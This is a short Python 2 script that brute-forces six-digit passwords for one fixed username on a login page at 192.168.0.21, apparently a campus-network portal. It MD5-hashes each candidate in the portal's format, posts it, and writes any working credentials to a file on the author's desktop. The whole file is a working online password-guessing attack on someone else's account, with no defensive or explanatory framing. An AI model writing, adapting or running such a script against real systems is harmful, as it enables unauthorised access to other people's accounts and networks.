# encoding=utf8
import requests
import hashlib

username='201208023100113'

for first in range(0, 3):
    for second in range(0, 10):
        for third in range(0, 10):
            for fourth in range(0, 10):
                for fifth in range(0, 10):
                    for sixth in range(0, 10):
                        password = str(first) + str(second) + str(third) + str(fourth) + str(fifth) + str(sixth)
                        print username
                        print password
                        m = hashlib.md5()
                        m.update('1' + password + '12345678')
                        finalist = m.hexdigest() + '123456781'
                        url = 'http://192.168.0.21/'
                        header = {'User-Agent' : 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36'}
                        form_data = {'DDDDD':username,
                                     'upass':finalist,
                                     'R1':'0',
                                     'R2':'1',
                                     'para':'00',
                                     '0MKKey':'123456'
                        }
                        s = requests.session()
                        try:
                            response = s.post(url, data=form_data, headers=header)
                            if username in response.text:
                                print 'find it'
                                info = username + ',' + password
                                p = open('C:\\Users\\Lu\\Desktop\\192\\' + username + '.txt', 'w+')
                                p.write(info)
                                p.close()
                            print 'wrong'
                        except:
                            print 'failed'
        
